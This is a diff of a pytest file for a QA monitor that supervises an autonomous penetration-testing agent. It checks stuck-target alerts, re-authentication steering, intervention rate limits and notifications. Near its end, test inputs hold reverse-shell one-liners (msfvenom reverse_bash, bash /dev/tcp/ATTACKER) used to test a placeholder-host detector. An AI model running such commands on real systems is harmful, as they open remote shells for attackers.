@@ -13,6 +13,18 @@ from unittest.mock import AsyncMock, MagicMock, patch
 
 import core.qa_agent
 import core.quick_log
+
+
+@pytest.fixture(autouse=True)
+def _isolate_composition_graph(monkeypatch):
+    """The composition-obligation check builds its graph from the live on-disk stores
+    (candidate_chains(build_graph())), independent of the findings_data fixture a test
+    passes. Point it at an empty graph so these checks run against the test's own inputs
+    and never pick up the repo's live findings.json (no QA test here exercises the
+    bridge/composition path — that lives in test_compositional_chaining.py)."""
+    import core.graph as _cg
+    from core.graph.model import Graph
+    monkeypatch.setattr(_cg, "build_graph", lambda: Graph())
 from core.qa_agent import (
     _session_is_running, _read_qa_state,
     _sanitize_history, QADaemon,
@@ -23,11 +35,12 @@ from core.qa_agent import (
     _check_missing_skill,
     _check_suspicious_speed, _check_na_abuse, _check_depth_after_finding,
     _check_whitebox_passes, _check_premature_complete, _check_stuck_on_target,
+    _check_chain_correlation,
     _maybe_inject_web_exploit_directive, _maybe_inject_param_fuzz_directive,
     _maybe_inject_business_logic_directive, _check_core_skill_chain,
     _hir, _check_auth_failure, _check_budget_limit, _check_zero_endpoints,
     _check_target_unreachable, _check_exploit_escalation, _check_repeated_tool_failure,
-    _ts_age_secs,
+    _ts_age_secs, _check_unregistered_findings,
 )
 from core.quick_log import QuickLog
 
@@ -150,6 +163,54 @@ def test_tool_inactivity_counts_spider_entries():
 
 
 # ---------------------------------------------------------------------------
+# _check_chain_correlation
+# ---------------------------------------------------------------------------
+
+def _hc_finding(title, target="https://t"):
+    return {"title": title, "severity": "high", "target": target}
+
+
+def test_chain_correlation_needs_two_same_target_findings():
+    # Single finding → no nudge.
+    assert _check_chain_correlation({"findings": [_hc_finding("a")]}) is None
+    # Two findings on different targets → no shared-target chain candidate.
+    data = {"findings": [_hc_finding("a", "https://x"), _hc_finding("b", "https://y")]}
+    assert _check_chain_correlation(data) is None
+
+
+def test_chain_correlation_skips_when_chain_exists():
+    data = {
+        "findings": [_hc_finding("a"), _hc_finding("b")],
+        "chains": [{"name": "already"}],
+    }
+    assert _check_chain_correlation(data) is None
+
+
+def test_chain_correlation_fires_and_injects_directive(tmp_path, monkeypatch):
+    import core.steering as st_mod
+    import core.qa_agent as qa_mod
+    steering_file = tmp_path / "steering_queue.json"
+    monkeypatch.setattr(st_mod, "_STEERING_FILE", steering_file)
+    monkeypatch.setattr(qa_mod, "_STEERING_FILE", steering_file)
+
+    data = {"findings": [_hc_finding("Open redirect"), _hc_finding("OAuth code theft")]}
+    alert = _check_chain_correlation(data)
+    assert alert is not None
+    assert alert["code"] == "CHAIN_CORRELATION"
+    assert alert["blocking"] is False
+    q = st_mod.SteeringQueue()
+    assert any(d["trigger"] == "CHAIN_CORRELATION" for d in q._load())
+
+
+def test_chain_correlation_ignores_false_positives():
+    data = {"findings": [
+        _hc_finding("a"),
+        {**_hc_finding("b"), "status": "false_positive"},
+    ]}
+    assert _check_chain_correlation(data) is None
+
+
+# ---------------------------------------------------------------------------
 # _check_bulk_marking
 # ---------------------------------------------------------------------------
 
@@ -191,6 +252,50 @@ def test_coverage_integrity_fires():
     assert alert["code"] == "COVERAGE_INTEGRITY"
     assert alert["blocking"] is True
     assert "5" in alert["message"]
+
+
+# ---------------------------------------------------------------------------
+# _check_unregistered_findings — discovery-before-testing gap
+# ---------------------------------------------------------------------------
+
+def test_unregistered_findings_none_when_all_registered():
+    cov = {"endpoints": [{"path": "/login", "_normalized": "/login"}]}
+    fnd = {"findings": [{"target": "http://t/login", "status": "confirmed"}]}
+    assert _check_unregistered_findings(fnd, cov) is None
+
+
+def test_unregistered_findings_none_when_matrix_empty():
+    # zero registered endpoints is a different signal (handled by _check_zero_endpoints)
+    fnd = {"findings": [{"target": "http://t/anything"}]}
+    assert _check_unregistered_findings(fnd, {"endpoints": []}) is None
+
+
+def test_unregistered_findings_advisory_not_blocking():
+    """The gap-guard now nudges but does NOT block completion or steer the model.
+    The blocking + STOP-opening-new-ground steering suppressed creative
+    exploitation (see the coverage-grind regression analysis)."""
+    cov = {"endpoints": [{"path": "/login", "_normalized": "/login"}]}
+    fnd = {"findings": [{"target": "http://t/transfer"}]}
+    alert = _check_unregistered_findings(fnd, cov)
+    assert alert is not None
+    assert alert["code"] == "DISCOVERY_GAP"
+    assert alert["blocking"] is False
+    assert alert["urgency"] == "low"
+    assert "/transfer" in alert["message"]
+
+
+def test_unregistered_findings_no_steer_directive(monkeypatch):
+    """Even with many unregistered findings, no steering directive is emitted —
+    the model should keep exploiting freely, not be told to STOP opening new ground."""
+    import core.steering as steering
+    calls = []
+    monkeypatch.setattr(steering.steering_queue, "add_directive",
+                        lambda **kw: calls.append(kw))
+    cov = {"endpoints": [{"path": "/login", "_normalized": "/login"}]}
+    fnd = {"findings": [{"target": f"http://t/u{i}"} for i in range(5)]}
+    alert = _check_unregistered_findings(fnd, cov)
+    assert alert["code"] == "DISCOVERY_GAP"
+    assert calls == []  # no steering directive emitted
 
 
 # ---------------------------------------------------------------------------
@@ -898,10 +1003,17 @@ def test_whitebox_passes_fires_at_zero(tmp_path, monkeypatch):
     monkeypatch.setattr(st_mod, "_STEERING_FILE", steering_file)
     monkeypatch.setattr(qa_mod, "_STEERING_FILE", steering_file)
 
-    alert = _check_whitebox_passes([], {"depth": "thorough"})
+    wb = {"depth": "thorough", "skill_history": [{"skill": "codebase"}]}
+    alert = _check_whitebox_passes([], wb)
     assert alert is not None
     assert alert["code"] == "WHITEBOX_PASSES"
     assert "0/3" in alert["message"]
+
+
+def test_whitebox_passes_skipped_on_blackbox():
+    # No codebase / semgrep / trufflehog → black-box scan → gate must NOT fire.
+    assert _check_whitebox_passes([], {"depth": "thorough"}) is None
+    assert _check_whitebox_passes([], {"depth": "thorough", "skill_history": [{"skill": "web-exploit"}]}) is None
 
 
 def test_whitebox_passes_fires_at_one(tmp_path, monkeypatch):
@@ -925,7 +1037,7 @@ def test_whitebox_passes_directive_injected(tmp_path, monkeypatch):
     monkeypatch.setattr(st_mod, "_STEERING_FILE", steering_file)
     monkeypatch.setattr(qa_mod, "_STEERING_FILE", steering_file)
 
-    _check_whitebox_passes([], {"depth": "thorough"})
+    _check_whitebox_passes([], {"depth": "thorough", "skill_history": [{"skill": "codebase"}]})
     q = st_mod.SteeringQueue()
     assert any(d.get("trigger") == "WHITEBOX_PASSES" for d in q._load())
 
@@ -950,11 +1062,19 @@ def test_premature_complete_enough_passes():
 
 def test_premature_complete_fires():
     entries = [{"type": "COMPLETE", "ts": _ts(1)}]
-    alert = _check_premature_complete(entries, {"depth": "thorough"})
+    wb = {"depth": "thorough", "skill_history": [{"skill": "codebase"}]}
+    alert = _check_premature_complete(entries, wb)
     assert alert is not None
     assert alert["code"] == "PREMATURE_COMPLETE"
     assert alert["blocking"] is True
     assert "0 done" in alert["message"]
+
+
+def test_premature_complete_skipped_on_blackbox():
+    # Black-box thorough scan (no codebase): the semgrep-pass gate must NOT block
+    # completion (it would deadlock — semgrep has nothing to scan).
+    entries = [{"type": "COMPLETE", "ts": _ts(1)}]
+    assert _check_premature_complete(entries, {"depth": "thorough"}) is None
 
 
 # ---------------------------------------------------------------------------
@@ -963,7 +1083,7 @@ def test_premature_complete_fires():
 
 def test_stuck_on_target_too_few_tool_calls():
     entries = [_tool_entry(offset_min=5)] * 3
-    assert _check_stuck_on_target(entries, {}, []) is None
+    assert _check_stuck_on_target(entries, {}, {},[]) is None
 
 
 def test_stuck_on_target_spread_across_targets():
@@ -971,13 +1091,13 @@ def test_stuck_on_target_spread_across_targets():
         _tool_entry("nmap", f"https://host{i}.com", offset_min=5)
         for i in range(5)
     ]
-    assert _check_stuck_on_target(entries, {}, []) is None
+    assert _check_stuck_on_target(entries, {}, {},[]) is None
 
 
 def test_stuck_on_target_recent_finding_allows_pass():
     entries = [_tool_entry("nmap", "https://example.com", offset_min=5)] * 5
     findings = {"findings": [_finding_entry(target="https://example.com", offset_min=10)]}
-    assert _check_stuck_on_target(entries, findings, []) is None
+    assert _check_stuck_on_target(entries, findings, {}, []) is None
 
 
 def test_stuck_on_target_first_detection(tmp_path, monkeypatch):
@@ -988,7 +1108,7 @@ def test_stuck_on_target_first_detection(tmp_path, monkeypatch):
     monkeypatch.setattr(qa_mod, "_STEERING_FILE", steering_file)
 
     entries = [_tool_entry("nmap", "https://example.com", offset_min=5)] * 6
-    alert = _check_stuck_on_target(entries, {}, [])
+    alert = _check_stuck_on_target(entries, {}, {},[])
     assert alert is not None
     assert alert["code"] == "STUCK_ON_TARGET"
     assert "example.com" in alert["message"]
@@ -1008,12 +1128,17 @@ def test_stuck_on_target_second_detection_triggers_hir(tmp_path, monkeypatch):
         previous_alerts = [
             {"code": "STUCK_ON_TARGET", "message": "Stuck on target: 6 tool calls against 'https://example.com' ..."}
         ]
-        alert = _check_stuck_on_target(entries, {}, previous_alerts)
+        alert = _check_stuck_on_target(entries, {}, {},previous_alerts)
         assert alert is not None
         assert alert["code"] == "STUCK_ON_TARGET"
         mock_trigger.assert_called_once()
-        call_kwargs = mock_trigger.call_args
-        assert call_kwargs[1]["code"] == "HIR_STUCK_ON_TARGET" or call_kwargs[0][0] == "HIR_STUCK_ON_TARGET"
+        # Accept either calling convention — the dedup refactor moved the call
+        # site to _hir() which forwards positional args; the previous direct
+        # trigger_intervention call used kwargs. Using .get() instead of [] so
+        # the short-circuit OR works (the kwargs path no longer has 'code').
+        call_args = mock_trigger.call_args
+        code = call_args.kwargs.get("code") or (call_args.args[0] if call_args.args else None)
+        assert code == "HIR_STUCK_ON_TARGET"
 
 
 def test_stuck_on_target_no_double_hir(tmp_path, monkeypatch):
@@ -1030,8 +1155,51 @@ def test_stuck_on_target_no_double_hir(tmp_path, monkeypatch):
         previous_alerts = [
             {"code": "STUCK_ON_TARGET", "message": "Stuck on target: 6 tool calls against 'https://example.com' ..."}
         ]
-        _check_stuck_on_target(entries, {}, previous_alerts)
+        _check_stuck_on_target(entries, {}, {},previous_alerts)
         mock_trigger.assert_not_called()
+
+
+def test_stuck_on_target_suppressed_after_resolution():
+    # The STUCK HIR for this target was already resolved 2 min ago, and the 6
+    # stale calls are OLDER than that resolution (no new spinning since) — must
+    # NOT re-fire. Without the fix, those stale calls stay in the 30-min window
+    # and re-trigger the HIR every cycle (the storm the operator hit).
+    entries = [_tool_entry("nmap", "https://example.com", offset_min=10)] * 6
+    session_data = {"intervention_history": [{
+        "code": "HIR_STUCK_ON_TARGET",
+        "situation": "Smith has made 6 tool calls against 'https://example.com' ...",
+        "resolved_at": _ts(2),
+    }]}
+    previous_alerts = [
+        {"code": "STUCK_ON_TARGET", "message": "Stuck on target: 6 ... 'https://example.com' ..."}
+    ]
+    assert _check_stuck_on_target(entries, {}, session_data, previous_alerts) is None
+
+
+def test_stuck_on_target_refires_on_new_spinning_after_resolution(tmp_path, monkeypatch):
+    # Resolved 10 min ago, then 5+ FRESH calls (1 min ago) with no progress →
+    # genuinely still stuck after going deeper → SHOULD re-escalate.
+    import core.steering as st_mod
+    import core.qa_agent as qa_mod
+    steering_file = tmp_path / "steering_queue.json"
+    monkeypatch.setattr(st_mod, "_STEERING_FILE", steering_file)
+    monkeypatch.setattr(qa_mod, "_STEERING_FILE", steering_file)
+
+    session_data = {"intervention_history": [{
+        "code": "HIR_STUCK_ON_TARGET",
+        "situation": "...against 'https://example.com'...",
+        "resolved_at": _ts(10),
+    }]}
+    entries = [_tool_entry("nmap", "https://example.com", offset_min=1)] * 6
+    previous_alerts = [
+        {"code": "STUCK_ON_TARGET", "message": "Stuck on target: 6 ... 'https://example.com' ..."}
+    ]
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention"):
+        alert = _check_stuck_on_target(entries, {}, session_data, previous_alerts)
+    # Returns the alert (refire path taken) — the opposite of the suppressed case,
+    # which returns None. (Whether _hir's min-gap fires the trigger is its own concern.)
+    assert alert is not None and alert["code"] == "STUCK_ON_TARGET"
 
 
 # ---------------------------------------------------------------------------
@@ -1306,17 +1474,64 @@ def test_hir_swallows_exceptions():
 
 
 # ---------------------------------------------------------------------------
+# _hir min-gap backstop — prevents the burst the user observed (5 HIR_STUCK_ON_TARGET
+# events fired within 137ms because get_intervention() read a stale cache).
+# Even if dedup were defeated, this floor caps to 1 HIR per code per minute.
+# ---------------------------------------------------------------------------
+
+def test_hir_min_gap_blocks_second_trigger_within_window(monkeypatch):
+    """Two _hir() calls for the same code inside the gap window must
+    result in exactly ONE trigger_intervention. Simulates the QA-cycle
+    race where get_intervention() returns None twice in a row before
+    the first trigger's flush is observed by the second's read."""
+    import core.qa_agent as qa_mod
+    # Force a clean ledger so prior tests don't poison this one
+    monkeypatch.setattr(qa_mod, "_last_hir_trigger_ts", {})
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention") as mock_trigger:
+        qa_mod._hir("BURST_CODE", "s", [], [])
+        qa_mod._hir("BURST_CODE", "s", [], [])  # within gap — must be blocked
+        assert mock_trigger.call_count == 1
+
+
+def test_hir_min_gap_allows_different_codes(monkeypatch):
+    """The gap is PER CODE — an unrelated HIR (e.g. HIR_AUTH_FAILURE)
+    must still fire even if HIR_STUCK_ON_TARGET just fired. Otherwise
+    one burst-blocked code would suppress all other QA checks for 60s."""
+    import core.qa_agent as qa_mod
+    monkeypatch.setattr(qa_mod, "_last_hir_trigger_ts", {})
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention") as mock_trigger:
+        qa_mod._hir("CODE_A", "s", [], [])
+        qa_mod._hir("CODE_B", "s", [], [])  # different code, allowed
+        assert mock_trigger.call_count == 2
+
+
+def test_hir_min_gap_allows_retrigger_after_window(monkeypatch):
+    """After _HIR_MIN_GAP_SECONDS has elapsed, the same code is allowed
+    to re-fire. Tested by overriding the ledger entry to simulate a
+    past trigger past the gap."""
+    import core.qa_agent as qa_mod
+    monkeypatch.setattr(qa_mod, "_last_hir_trigger_ts",
+                        {"OLD_CODE": 0.0})  # epoch-1970 → way past the gap
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention") as mock_trigger:
+        qa_mod._hir("OLD_CODE", "s", [], [])
+        assert mock_trigger.call_count == 1
+
+
+# ---------------------------------------------------------------------------
 # _check_auth_failure
 # ---------------------------------------------------------------------------
 
 def test_auth_failure_too_few_entries():
     entries = [_http_entry(status_code=401)] * 3
-    assert _check_auth_failure(entries) is None
+    assert _check_auth_failure(entries, {}, []) is None
 
 
 def test_auth_failure_never_authed():
     entries = [_http_entry(status_code=401)] * 5
-    assert _check_auth_failure(entries) is None
+    assert _check_auth_failure(entries, {}, []) is None
 
 
 def test_auth_failure_low_failure_rate():
@@ -1324,32 +1539,74 @@ def test_auth_failure_low_failure_rate():
         [_http_entry(status_code=200)] * 5 +
         [_http_entry(status_code=401)] * 2
     )
-    assert _check_auth_failure(entries) is None
+    assert _check_auth_failure(entries, {}, []) is None
 
 
-def test_auth_failure_fires(tmp_path, monkeypatch):
+def test_auth_failure_first_detection_steers_reauth(monkeypatch):
+    # FIRST detection self-heals: steer Smith to re-auth + AUTH_REAUTH advisory,
+    # NOT a human HIR.
+    import core.qa_agent as _qa
+    import core.steering as steering
+    monkeypatch.setattr(_qa, "_has_pending_directives", lambda: False)
+    calls = []
+    monkeypatch.setattr(steering.steering_queue, "add_directive", lambda **kw: calls.append(kw))
+    with patch("core.session.trigger_intervention") as mock_trigger:
+        entries = [_http_entry(status_code=200)] * 5 + [_http_entry(status_code=401)] * 8
+        sess = {"known_assets": {"credentials": [{"username": "u"}],
+                                 "auth_endpoints": [{"path": "/login"}]}}
+        alert = _check_auth_failure(entries, sess, [])
+    assert alert["code"] == "AUTH_REAUTH" and alert["blocking"] is False
+    mock_trigger.assert_not_called()                  # no human pause on first detection
+    assert calls and calls[0]["trigger"] == "AUTH_REAUTH"
+    assert "/login" in calls[0]["message"]            # concrete re-auth hint included
+
+
+def test_auth_failure_escalates_to_hir_after_reauth_attempt():
+    # A prior cycle already steered AUTH_REAUTH and 401/403 still dominates → HIR.
     with patch("core.session.get_intervention", return_value=None), \
          patch("core.session.trigger_intervention") as mock_trigger:
-        entries = (
-            [_http_entry(status_code=200)] * 5 +
-            [_http_entry(status_code=401)] * 8
-        )
-        alert = _check_auth_failure(entries)
-        assert alert is not None
+        entries = [_http_entry(status_code=200)] * 5 + [_http_entry(status_code=401)] * 8
+        alert = _check_auth_failure(entries, {}, [{"code": "AUTH_REAUTH"}])
         assert alert["code"] == "HIR_AUTH_FAILURE"
         mock_trigger.assert_called_once()
 
 
-def test_auth_failure_403_also_counts():
-    with patch("core.session.get_intervention", return_value=None), \
-         patch("core.session.trigger_intervention"):
-        entries = (
-            [_http_entry(status_code=200)] * 5 +
-            [_http_entry(status_code=403)] * 8
-        )
-        alert = _check_auth_failure(entries)
-        assert alert is not None
-        assert alert["code"] == "HIR_AUTH_FAILURE"
+def test_auth_failure_ignores_forbidden_endpoint(monkeypatch):
+    # REGRESSION: session is alive (path /ok keeps returning 2xx) while Smith hammers a
+    # legitimately access-controlled endpoint (/internal/config.json, ONLY ever 403).
+    # Those 403s are authz, not session expiry — must NOT fire (previously false-positived
+    # into HIR_AUTH_FAILURE, the /internal/config.json miss).
+    import core.qa_agent as _qa
+    monkeypatch.setattr(_qa, "_has_pending_directives", lambda: False)
+    entries = (
+        [_http_entry(status_code=200, target="https://t/ok")] * 4 +
+        [_http_entry(status_code=403, target="https://t/internal/config.json")] * 6
+    )
+    # even after a prior reauth steer, a forbidden endpoint must not escalate to a human
+    assert _check_auth_failure(entries, {"known_assets": {}}, [{"code": "AUTH_REAUTH"}]) is None
+
+
+def test_auth_failure_fires_on_degraded_authed_path(monkeypatch):
+    # A path that authed earlier (2xx) then degrades to 401 IS session expiry → still fires.
+    import core.qa_agent as _qa
+    monkeypatch.setattr(_qa, "_has_pending_directives", lambda: False)
+    import core.steering as steering
+    monkeypatch.setattr(steering.steering_queue, "add_directive", lambda **kw: None)
+    entries = (
+        [_http_entry(status_code=200, target="https://t/ok")] * 3 +
+        [_http_entry(status_code=401, target="https://t/ok")] * 7
+    )
+    with patch("core.session.trigger_intervention"):
+        alert = _check_auth_failure(entries, {"known_assets": {}}, [])
+    assert alert and alert["code"] == "AUTH_REAUTH"
+
+
+def test_auth_failure_403_first_detection_steers(monkeypatch):
+    import core.qa_agent as _qa
+    monkeypatch.setattr(_qa, "_has_pending_directives", lambda: True)  # skip add_directive side effect
+    entries = [_http_entry(status_code=200)] * 5 + [_http_entry(status_code=403)] * 8
+    alert = _check_auth_failure(entries, {}, [])
+    assert alert["code"] == "AUTH_REAUTH"
 
 
 # ---------------------------------------------------------------------------
@@ -1543,3 +1800,142 @@ def test_repeated_tool_failure_fires():
         assert alert["code"] == "HIR_TOOL_FAILURE"
         assert "nmap" in alert["message"]
         mock_trigger.assert_called_once()
+
+
+def test_repeated_tool_failure_client_size_error_is_advisory_not_hir():
+    # aiohttp LineTooLong ("Got more than 8190 bytes") on a RESPONDING target is not a
+    # reachability failure — it must NOT halt the scan with an HIR (the misdiagnosis that fired
+    # 3× on a healthy target during exfiltration-via-header). It surfaces as a non-blocking
+    # advisory instead, and never calls trigger_intervention.
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention") as mock_trigger:
+        err = "400, message=\"Got more than 8190 bytes when reading: b'token=eyJ...'\", url='http://t/login'"
+        entries = [{"type": "TOOL", "name": "http_request", "target": "http://t",
+                    "ts": _ts(1), "error": err} for _ in range(3)]
+        alert = _check_repeated_tool_failure(entries)
+        assert alert is not None
+        assert alert["code"] == "TOOL_RESPONSE_TOO_LARGE"
+        assert alert["blocking"] is False
+        assert "not a target-reachability" in alert["message"].lower()
+        mock_trigger.assert_not_called()   # no scan-halting HIR
+
+
+def test_repeated_tool_failure_network_error_still_fires_hir(monkeypatch):
+    # A genuine network-level failure (connection refused / timeout) still gets the reachability HIR.
+    import core.qa_agent as qa_mod
+    monkeypatch.setattr(qa_mod, "_last_hir_trigger_ts", {})   # clear cross-test HIR dedup
+    with patch("core.session.get_intervention", return_value=None), \
+         patch("core.session.trigger_intervention") as mock_trigger:
+        entries = [{"type": "TOOL", "name": "http_request", "target": "http://t", "ts": _ts(1),
+                    "error": "Cannot connect to host t:80 ssl:default [Connection refused]"}
+                   for _ in range(3)]
+        alert = _check_repeated_tool_failure(entries)
+        assert alert["code"] == "HIR_TOOL_FAILURE"
+        mock_trigger.assert_called_once()
+
+
+def test_is_client_response_size_error_classification():
+    from core.qa_agent.checks_health import _is_client_response_size_error as f
+    assert f("Got more than 8190 bytes when reading: b'token=...'")
+    assert f("400, message='Header value is too long'")
+    assert f("aiohttp LineTooLong: ...")
+    assert not f("Cannot connect to host example.com:443 [Connection refused]")
+    assert not f("TimeoutError")
+    assert not f("")
+
+
+# ── reverse-shell placeholder-LHOST guard ────────────────────────────────────
+def _kali_cmd_entry(command, offset_min=1):
+    return {"type": "TOOL", "name": "kali", "command": command, "target": "http://t",
+            "ts": _ts(offset_min)}
+
+
+def test_reverse_shell_placeholder_lhost_advisory():
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry(
+        "msfvenom -p cmd/unix/reverse_bash LHOST=attacker.example.com LPORT=4444 -f raw")]
+    alert = f(entries, {"known_assets": {}})
+    assert alert is not None
+    assert alert["code"] == "REVERSE_SHELL_NO_LHOST"
+    assert alert["blocking"] is False
+    assert "oob_mint" in alert["message"] and "wishlist_add" in alert["message"]
+
+
+def test_reverse_shell_real_operator_lhost_suppresses_advisory():
+    # An operator listener (SMITH_LHOST → known_assets.attacker_host) makes the payload
+    # legitimate — no nag.
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("msfvenom -p ... LHOST=attacker.example.com LPORT=4444")]
+    sess = {"known_assets": {"attacker_host": {"lhost": "5.6.7.8", "lport": 4444}}}
+    assert f(entries, sess) is None
+
+
+def test_reverse_shell_real_ip_lhost_no_advisory():
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("msfvenom -p cmd/unix/reverse_bash LHOST=1.2.3.4 LPORT=4444 -f raw")]
+    assert f(entries, {"known_assets": {}}) is None
+
+
+def test_reverse_shell_attacker_prefix_real_host_no_false_positive():
+    # REGRESSION: a genuine hostname that merely STARTS with 'attacker' (attacker.corp.com) must
+    # NOT be flagged — the old loose-substring match ('lhost=attacker') falsely triggered here.
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("msfvenom -p cmd/unix/reverse_bash LHOST=attacker.corp.com LPORT=4444")]
+    assert f(entries, {"known_assets": {}}) is None
+
+
+def test_reverse_shell_literal_attacker_placeholder_in_devtcp():
+    # The /dev/tcp/ATTACKER/PORT one-liner form is also caught (extracted host token 'attacker').
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")]
+    alert = f(entries, {"known_assets": {}})
+    assert alert is not None and alert["code"] == "REVERSE_SHELL_NO_LHOST"
+
+
+def test_reverse_shell_non_revshell_command_ignored():
+    from core.qa_agent.checks_health import _check_reverse_shell_placeholder_lhost as f
+    entries = [_kali_cmd_entry("nmap -sV -p- attacker.example.com")]   # placeholder host but not a revshell
+    assert f(entries, {"known_assets": {}}) is None
+
+
+# ── _cycle() Telegram notification path ───────────────────────────────────────
+
+@pytest.mark.asyncio
+async def test_cycle_calls_notify_for_high_urgency_alerts(tmp_path, monkeypatch):
+    import core.steering as st_mod
+    monkeypatch.setattr(st_mod, "_STEERING_FILE", tmp_path / "steering_queue.json")
+    _setup_cycle_files(tmp_path, monkeypatch)
+    monkeypatch.setattr(core.quick_log, "quick_log",
+                        _mock_ql(entries=[_coverage_entry(na_untooled=15)]))
+
+    high_alert = {"code": "BULK_MARKING", "urgency": "high", "blocking": False,
+                  "message": "too many untooled"}
+    with patch("core.qa_agent._deterministic_qa_checks", return_value=[high_alert]), \
+         patch("core.notifiers.notify") as mock_notify:
+        daemon = QADaemon()
+        await daemon._cycle()
+
+    mock_notify.assert_called_once_with(
+        title="[QA] BULK_MARKING",
+        body="too many untooled",
+        urgency="high",
+        code="BULK_MARKING",
+    )
+
+
+@pytest.mark.asyncio
+async def test_cycle_notify_exception_is_swallowed(tmp_path, monkeypatch):
+    import core.steering as st_mod
+    monkeypatch.setattr(st_mod, "_STEERING_FILE", tmp_path / "steering_queue.json")
+    qa_state = _setup_cycle_files(tmp_path, monkeypatch)
+    monkeypatch.setattr(core.quick_log, "quick_log",
+                        _mock_ql(entries=[_coverage_entry(na_untooled=15)]))
+
+    high_alert = {"code": "BULK_MARKING", "urgency": "high", "blocking": False,
+                  "message": "too many untooled"}
+    with patch("core.qa_agent._deterministic_qa_checks", return_value=[high_alert]), \
+         patch("core.notifiers.notify", side_effect=RuntimeError("sink down")):
+        daemon = QADaemon()
+        await daemon._cycle()  # must not raise
+
+    assert qa_state.exists()  # cycle still wrote state despite notification failure
